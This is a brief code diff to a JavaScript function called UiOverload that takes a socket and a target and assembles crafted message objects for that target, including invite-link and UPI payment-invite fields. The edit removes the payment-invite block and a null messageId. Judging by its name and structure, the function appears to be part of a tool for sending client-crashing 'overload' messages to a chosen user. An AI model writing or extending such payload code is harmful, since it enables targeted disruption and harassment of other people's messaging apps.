@@ -186,13 +186,6 @@ export async function UiOverload(sock, target) {
         inviteLinkGroupTypeV2: "DEFAULT",
       },
     },
-    {
-      paymentInviteMessage: {
-        serviceType: "UPI",
-        expiryTimestamp: Date.now() + 5184000000,
-      },
-    },
     { participant: { jid: target } },
-    { messageId: null },
   );
 }
